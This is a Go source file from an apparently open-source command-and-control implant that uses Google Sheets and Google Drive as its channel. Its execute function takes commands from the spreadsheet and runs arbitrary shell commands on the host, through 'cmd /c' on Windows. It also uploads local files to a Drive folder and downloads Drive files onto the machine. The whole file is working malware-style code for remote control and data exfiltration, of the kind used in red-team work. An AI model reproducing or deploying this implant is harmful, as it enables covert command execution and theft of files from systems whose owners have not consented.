package C2

import (
	"GC2-sheet/internal/configuration"
	"GC2-sheet/internal/utils"
	"fmt"
	"os/exec"
	"runtime"
	"strings"

	"google.golang.org/api/drive/v3"
)

func execute(spreadSheet *configuration.SpreadSheet, clientDrive *drive.Service, lastCommand *configuration.Commands, commandToExecute string) {

	// Checking for download command
	if strings.HasPrefix(commandToExecute, "download") {
		slittedCommand := strings.Split(commandToExecute, ";")
		if len(slittedCommand) == 3 {
			fileDriveId := slittedCommand[1]
			downloadPath := slittedCommand[2]
			utils.LogDebug("New download command: FileId " + fileDriveId + " saving it to: " + downloadPath)
			downloadErr := downloadFile(clientDrive, fileDriveId, downloadPath)
			if downloadErr != nil {
				lastCommand.Output = downloadErr.Error()
			} else {
				lastCommand.Output = "File Downloaded"
			}
			return
		}
	}

	// Checking for upload command
	if strings.HasPrefix(commandToExecute, "upload") {
		slittedCommand := strings.Split(commandToExecute, ";")
		if len(slittedCommand) == 2 {
			uploadFilePath := slittedCommand[1]
			utils.LogDebug("New upload command: file path: " + uploadFilePath)
			uploadErr := uploadFile(clientDrive, uploadFilePath, spreadSheet.DriveId)

			if uploadErr != nil {
				lastCommand.Output = uploadErr.Error()
			} else {
				lastCommand.Output = fmt.Sprintf("File Uploaded to: https://drive.google.com/drive/u/0/folders/%s", spreadSheet.DriveId)
			}
			return
		}
	}

	// Checking for exit command
	if commandToExecute == "exit" {
		Exit()
	}

	// Execute the command
	lastCommand.Output = executeCommand(commandToExecute)

	utils.LogDebug("Execution")
}

func executeCommand(commandToExecute string) string {

	var arguments []string
	var outCommand []byte
	var err error

	splitArgs := strings.Split(commandToExecute, " ")
	if runtime.GOOS != "windows" {
		if len(splitArgs) > 1 {
			// Get arguments after command Example: -la
			arguments = splitArgs[1:]
			// Get command without arguments Example: ls
			commandToExecute = splitArgs[0]
		}
		outCommand, err = exec.Command(commandToExecute, arguments...).Output()
	} else {
		// For windows commands must be on the form: "cmd /c <command>" Example "cmd /C dir"
		arguments = append(arguments, "/c")
		arguments = append(arguments, splitArgs...)
		outCommand, err = exec.Command("cmd", arguments...).Output()
	}

	if err != nil {
		out := err.Error()
		return out
	}

	out := string(outCommand)
	return out
}
